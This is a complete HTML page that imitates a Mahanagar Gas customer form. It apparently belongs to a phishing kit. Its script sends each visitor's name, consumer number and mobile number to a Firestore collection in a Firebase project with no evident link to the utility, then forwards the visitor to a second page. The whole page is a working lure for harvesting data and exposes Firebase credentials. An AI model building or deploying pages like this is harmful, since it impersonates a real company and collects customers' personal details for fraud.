<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>mgl gas</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      font-family: Arial, sans-serif;
      background-color: #FFFFFF;
      margin: 0;
      padding: 20px;
      text-align: center;
    }
    img {
      width: 100%;
      max-width: 300px;
      border-radius: 10px;
    }
    .form-container {
      margin-top: 30px;
      background: white;
      padding: 20px;
      border-radius: 10px;
      max-width: 100%;
      width: 100%;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .form-container h2 {
      background-color: #0f7213;
      color: white;
      padding: 12px;
      font-size: 20px;
      border-radius: 5px;
    }
    label {
      font-size: 16px;
      font-weight: bold;
      display: block;
      margin-top: 15px;
      text-align: left;
    }
    input[type="text"], input[type="email"] {
      width: 100%;
      padding: 12px;
      margin-top: 5px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .side-button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      font-size: 16px;
      background-color: #4082ff;
      color: #FFFFFF;
      border: none;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <img src="https://i.ibb.co/s9ptXmZv/images-5.jpg" alt="Meri Tasveer" />

  <div class="form-container">
    <h2>Mahanagar Gas</h2>
    <form onsubmit="submitForm(event)">
      <label for="name">Name*</label>
      <input type="text" id="name" placeholder="Full Name" required />

      <label for="kno">Consumer Number*</label>
      <input type="text" id="kno" placeholder="Consumer Number" required />

      <label for="mobile">Mobile*</label>
      <input type="text" id="mobile" placeholder="Mobile Number" required />

      <button class="side-button" type="submit">Continue</button>
    </form>
  </div>

  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
      authDomain: "dlhiljbrd.firebaseapp.com",
      projectId: "dlhiljbrd",
      storageBucket: "dlhiljbrd.firebasestorage.app",
      messagingSenderId: "981951131769",
      appId: "1:981951131769:web:5d56cd1423d753992664a8"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    function submitForm(e) {
      e.preventDefault();
      const name = document.getElementById("name").value;
      const kno = document.getElementById("kno").value;
      const mobile = document.getElementById("mobile").value;

      db.collection("users").add({
        name,
        kno,
        mobile,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
      }).then(() => {
        window.location.href = "page2.html";
      }).catch((error) => {
        alert("Error saving data: " + error);
      });
    }
  </script>
</body>
</html>
